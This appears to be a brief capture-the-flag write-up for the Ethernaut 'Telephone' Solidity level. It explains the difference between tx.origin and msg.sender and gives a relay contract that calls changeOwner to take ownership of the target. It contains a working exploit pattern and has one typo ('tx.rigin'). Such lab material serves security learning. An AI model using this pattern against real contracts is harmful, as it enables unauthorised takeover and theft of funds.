This is claimed by chained transactions.

f_A(f_B(f_C()))
^^ From the perspective of f_C(), msg.sender is f_B(), but 
tx.rigin is f_A()

So if we make a simple relay contract, we'll gain ownership

Like in CoinFlip, import the Telephone contract.
Write a function that calls the changeOwner function, and passes
in your attacking address, ie:

>> contract Relay {
>>     function Attack(address _target) public {
>>         Telephone telephone = Telephone(_target);
>>         telephone.changeOwner(msg.sender);
>>     }
>> }
